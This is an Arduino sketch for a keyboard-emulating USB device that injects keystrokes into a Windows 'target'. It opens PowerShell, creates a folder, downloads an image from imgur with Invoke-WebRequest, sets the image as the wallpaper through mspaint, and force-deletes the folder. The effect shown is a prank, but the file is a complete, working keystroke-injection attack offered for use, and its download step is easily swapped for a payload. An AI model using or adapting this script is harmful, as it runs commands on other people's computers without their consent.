#include <Keyboard.h>

// Press & release function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
  delay(150);
}

// Windows + key combination
void winKey(int key){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(key);
  Keyboard.releaseAll();
  delay(250);
}

// Hit return key with delays to let slower PC process
void enter(){
  delay(250);
  typeKey(KEY_RETURN);
  delay(350);
}

  // Start powershell
void powershell(){
  winKey(114);
  Keyboard.print("powershell.exe");
  enter();
}


void setup()
{
  // If the button is pressed, payload doesn't start
  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW){
    while(1);
  }
  
  Keyboard.begin();

  // Start Payload
  delay(3000);

  // Show desktop (minimize all windows)
  winKey(100);

  // Download image
  powershell();
  Keyboard.print("New-Item -Path C:\\ -Name pond -ItemType Directory"); //Creating a directory to store resources
  enter();
  Keyboard.print("Invoke-WebRequest https://i.imgur.com/bHp57l8.jpg -OutFile C:\\pond\\wallpaper.jpg");
  enter();
  delay(2000); // Additional delay if target has slow download speed

  Keyboard.print("cd C:\\pond ; mspaint wallpaper.jpg ; exit");
  enter();
  delay(2000); // Delay to open mspaint

  // Set image as background
  typeKey(KEY_LEFT_ALT);
  typeKey(102);
  typeKey(98);
  delay(750);
  
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  powershell();
  Keyboard.print("Remove-Item -Path C:\\pond -Recurse -Force");
  enter();
  Keyboard.print("exit");
  enter();  

  // End Payload
  Keyboard.end();
}

void loop() {}
